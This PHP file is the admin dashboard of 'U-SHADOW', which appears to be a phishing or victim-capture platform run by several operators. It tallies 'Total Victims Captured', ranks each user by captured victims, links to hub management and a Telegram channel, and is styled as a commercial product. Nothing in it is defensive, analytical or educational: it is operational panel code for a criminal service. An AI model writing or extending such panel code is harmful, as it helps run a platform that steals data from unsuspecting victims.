<?php
require_once __DIR__ . '/../config.php';
if (!isset($_SESSION['user']) || !($_SESSION['user']['is_admin'] ?? false)) {
    header('Location: /admin/login.php');
    exit;
}

$users = json_decode(file_get_contents(USERS_FILE), true);
$analytics = json_decode(file_get_contents(ANALYTICS_FILE), true);
$categories = json_decode(file_get_contents(CATEGORIES_FILE), true);

$total_users = count($users);
$total_victims = count($analytics);
$total_hubs = count($categories);

// Calculate victim counts for each user
$user_stats = [];
foreach ($analytics as $click) {
    $uid = $click['user_id'];
    $user_stats[$uid] = ($user_stats[$uid] ?? 0) + 1;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-shadow | Admin Dashboard</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="dashboard-body">

<div class="sidebar">
    <div class="sidebar-brand">U-SHADOW</div>
    <ul class="sidebar-menu">
        <li class="active"><a href="/admin/index.php"><i class="fas fa-chart-line"></i> Dashboard</a></li>
        <li><a href="/admin/users.php"><i class="fas fa-users"></i> User Management</a></li>
        <li><a href="/admin/categories.php"><i class="fas fa-plus-circle"></i> Manage Hubs</a></li>
        <li><a href="/admin/password.php"><i class="fas fa-key"></i> Security</a></li>
        <li><a href="/dashboard.php" style="color: #6ed3ff;"><i class="fas fa-arrow-left"></i> User Dashboard</a></li>
        <li style="margin-top: 100px;"><a href="/logout.php"><i class="fas fa-sign-out-alt"></i> Sign Out</a></li>
    </ul>
</div>

<main class="main-content">
    <div style="text-align: center; margin-bottom: 20px;">
        <a href="https://t.me/your_telegram" target="_blank" style="color: blue; text-decoration: underline; font-weight: 600; font-size: 18px;">Join Our Telegram</a>
    </div>

    <header class="top-bar">
        <div class="page-title">
            <h1>Administrator Control Panel</h1>
        </div>
        <div class="user-nav">
            <div class="user-info">
                <span class="name"><?php echo s($_SESSION['user']['username']); ?></span>
                <span class="role">Administrator</span>
            </div>
            <div class="avatar">A</div>
        </div>
    </header>

    <section class="stats-container">
        <div class="card-stat">
            <div class="label">Total Platform Users</div>
            <div class="value"><?php echo $total_users; ?></div>
            <div class="trend up"><i class="fa-solid fa-users"></i> Registered Members</div>
        </div>
        <div class="card-stat">
            <div class="label">Total Victims Captured</div>
            <div class="value"><?php echo $total_victims; ?></div>
            <div class="trend up"><i class="fa-solid fa-crosshairs"></i> Global Activity</div>
        </div>
    </section>

    <section class="section">
        <div class="section-header">
            <h2><i class="fas fa-users"></i> Users on the Platform</h2>
            <div style="font-size: 12px; color: var(--gray);">Monitoring user performance and captured data.</div>
        </div>
        <div class="section-content">
            <table class="custom-table">
                <thead>
                    <tr>
                        <th>Username</th>
                        <th>Captured Victims</th>
                        <th>Account Status</th>
                        <th>Role</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($users as $user): ?>
                    <tr>
                        <td><strong><?php echo s($user['username']); ?></strong></td>
                        <td><span class="text-primary" style="font-weight: 700; font-size: 16px;"><?php echo $user_stats[$user['username']] ?? 0; ?></span></td>
                        <td><span class="badge badge-success">ACTIVE</span></td>
                        <td><?php echo ($user['is_admin'] ?? false) ? 'Admin' : 'User'; ?></td>
                        <td>
                            <a href="/admin/users.php" class="btn-preview">MANAGE</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </section>

    <footer class="dashboard-footer">
        &copy; 2010-2025 | <strong>U-SHADOW Professional v3.5</strong> | All Rights Reserved.
    </footer>
</main>

</body>
</html>
